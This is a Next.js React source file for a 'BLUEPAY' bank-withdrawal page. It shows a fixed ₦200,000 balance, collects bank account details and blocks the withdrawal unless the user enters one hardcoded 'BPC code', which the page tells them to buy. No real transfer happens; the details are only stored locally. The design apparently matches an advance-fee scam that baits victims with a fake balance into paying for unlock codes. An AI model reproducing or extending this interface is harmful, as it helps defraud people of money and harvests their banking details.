"use client"

import { useEffect, useMemo, useState } from "react"
import { useRouter } from "next/navigation"
import { ArrowLeft, Check, ChevronDown, Search, ShieldCheck, UserRound, WalletCards } from "lucide-react"
import { saveTransaction } from "@/lib/transactions"

type Bank = { id: string; name: string; code: string; logo: string | null }

export default function WithdrawPage() {
  const router = useRouter()
  const [banks, setBanks] = useState<Bank[]>([])
  const [selectedBank, setSelectedBank] = useState<Bank | null>(null)
  const [accountNumber, setAccountNumber] = useState("")
  const [accountName, setAccountName] = useState("")
  const [amount, setAmount] = useState("")
  const [bpcCode, setBpcCode] = useState("")
  const [search, setSearch] = useState("")
  const [openBanks, setOpenBanks] = useState(false)
  const [loadingBanks, setLoadingBanks] = useState(false)
  const [bankError, setBankError] = useState("")
  const [error, setError] = useState("")
  const [balance] = useState(200000)

  useEffect(() => {
    let active = true
    setLoadingBanks(true)
    fetch("/api/banks")
      .then(async (response) => {
        const payload = await response.json()
        if (!response.ok) throw new Error(payload.error || "Unable to load supported banks.")
        if (active) setBanks(payload.banks)
      })
      .catch((reason: Error) => active && setBankError(reason.message))
      .finally(() => active && setLoadingBanks(false))
    return () => { active = false }
  }, [])

  const filteredBanks = useMemo(() => banks.filter((bank) => bank.name.toLowerCase().includes(search.toLowerCase())), [banks, search])
  const canContinue = Boolean(selectedBank && accountNumber.length === 10 && accountName && Number(amount) > 0 && bpcCode)

  function submit(e: React.FormEvent) {
    e.preventDefault()
    setError("")
    const value = Number(amount)
    if (!selectedBank || accountNumber.length !== 10 || !accountName || !value || !bpcCode) return setError("Complete all transfer details to continue.")
    if (value > balance) return setError("Insufficient available balance.")
    if (bpcCode !== "BPC2026_TELE_BOT_46Qa_VMC5") return setError("This BPC code is invalid. Buy a valid code from BLUEPAY2026.")
    saveTransaction({ type: "expense", category: "Withdrawal", description: `Transfer to ${selectedBank.name}`, amount: value, date: new Date().toISOString().split("T")[0], accountNumber, bankName: selectedBank.name, userName: accountName })
    localStorage.setItem("withdrawalData", JSON.stringify({ accountName, accountNumber, selectedBank: selectedBank.name, bankCode: selectedBank.code, amount: value, balance }))
    router.push("/withdrawal-confirmation")
  }

  return <main className="min-h-screen bg-[#f5f7fc] text-[#172033]">
    <header className="sticky top-0 z-20 flex h-16 items-center gap-3 bg-[#0000ff] px-4 text-white shadow-lg"><button aria-label="Go back" onClick={() => router.back()} className="rounded-full p-2 hover:bg-white/15"><ArrowLeft /></button><div><p className="text-[11px] font-medium text-blue-100">BLUEPAY MOBILE</p><h1 className="text-base font-bold">Transfer to bank</h1></div></header>
    <section className="mx-auto flex w-full max-w-md flex-col gap-4 p-4 pb-8">
      <div className="rounded-2xl bg-[#101a43] p-4 text-white shadow-md"><div className="flex items-center gap-2 text-xs text-blue-100"><WalletCards /> Available balance</div><p className="mt-2 text-2xl font-bold">₦{balance.toLocaleString()}</p><p className="mt-1 text-[11px] text-blue-100">Secure bank transfer</p></div>
      <form onSubmit={submit} className="flex flex-col gap-3 rounded-2xl border border-[#e7eaf2] bg-white p-4 shadow-sm">
        <div><label className="mb-1 block text-xs font-semibold text-[#788196]">Select bank</label><button type="button" onClick={() => setOpenBanks(!openBanks)} className="flex h-12 w-full items-center justify-between rounded-xl border border-[#e7eaf2] px-3 text-left text-sm"><span className={selectedBank ? "font-semibold" : "text-[#788196]"}>{selectedBank?.name || (loadingBanks ? "Loading supported banks..." : "Choose destination bank")}</span><ChevronDown /></button></div>
        {openBanks && <div className="rounded-xl border border-[#e7eaf2] bg-white p-2 shadow-lg"><div className="flex items-center gap-2 rounded-lg bg-[#f5f7fc] px-3"><Search className="text-[#788196]" /><input autoFocus value={search} onChange={(e) => setSearch(e.target.value)} placeholder="Search supported banks" className="h-10 w-full bg-transparent text-sm outline-none" /></div><div className="mt-2 max-h-60 overflow-y-auto">{filteredBanks.map((bank) => <button type="button" key={bank.id} onClick={() => { setSelectedBank(bank); setAccountName(""); setOpenBanks(false); setSearch("") }} className="flex w-full items-center gap-3 rounded-lg px-3 py-2.5 text-left text-sm hover:bg-blue-50"><span className="flex size-8 items-center justify-center rounded-full bg-[#eef2ff] text-[10px] font-bold text-[#0000ff]">{bank.name.slice(0, 2).toUpperCase()}</span><span className="flex-1">{bank.name}</span>{selectedBank?.id === bank.id && <Check className="text-[#0000ff]" />}</button>)}{!loadingBanks && !filteredBanks.length && <p className="p-4 text-center text-xs text-[#788196]">No supported banks found.</p>}</div></div>}
        {bankError && <p role="alert" className="rounded-lg bg-amber-50 px-3 py-2 text-xs text-amber-700">{bankError}</p>}
        <div><label className="mb-1 block text-xs font-semibold text-[#788196]">Account number</label><input inputMode="numeric" maxLength={10} value={accountNumber} onChange={(e) => { setAccountNumber(e.target.value.replace(/\D/g, "")); setAccountName("") }} placeholder="10-digit account number" className="h-12 w-full rounded-xl border border-[#e7eaf2] px-3 text-sm outline-none focus:border-[#0000ff]" /></div>
        <div><label className="mb-1 block text-xs font-semibold text-[#788196]">Verified account name</label><div className="relative"><UserRound className="absolute left-3 top-3.5 text-[#788196]" /><input value={accountName} onChange={(e) => setAccountName(e.target.value)} placeholder="Returned by account verification" className="h-12 w-full rounded-xl border border-[#e7eaf2] pl-10 pr-3 text-sm outline-none focus:border-[#0000ff]" /></div><p className="mt-1 text-[11px] text-[#788196]">Account verification remains provider-dependent; do not enter an unverified name.</p></div>
        <div><label className="mb-1 block text-xs font-semibold text-[#788196]">Amount</label><input inputMode="decimal" value={amount} onChange={(e) => setAmount(e.target.value.replace(/[^0-9]/g, ""))} placeholder="₦0" className="h-12 w-full rounded-xl border border-[#e7eaf2] px-3 text-sm outline-none focus:border-[#0000ff]" /></div>
        <div><label className="mb-1 block text-xs font-semibold text-[#788196]">BPC code</label><input value={bpcCode} onChange={(e) => setBpcCode(e.target.value)} placeholder="Enter your valid BPC code" className="h-12 w-full rounded-xl border border-[#e7eaf2] px-3 text-sm outline-none focus:border-[#0000ff]" /><button type="button" onClick={() => router.push("/buy-bpc")} className="mt-1 text-xs font-semibold text-[#0000ff]">Buy BPC code</button></div>
        {error && <p role="alert" className="rounded-lg bg-red-50 px-3 py-2 text-xs font-medium text-red-600">{error}</p>}<div className="flex items-center gap-2 rounded-lg bg-blue-50 px-3 py-2 text-[11px] text-[#101a43]"><ShieldCheck className="text-[#0000ff]" /> Your transfer is protected by BLUEPAY security checks.</div><button disabled={!canContinue} className="h-12 rounded-xl bg-[#0000ff] text-sm font-bold text-white shadow-md transition hover:bg-[#0000dd] disabled:cursor-not-allowed disabled:opacity-45">Review transfer</button>
      </form>
    </section>
  </main>
}
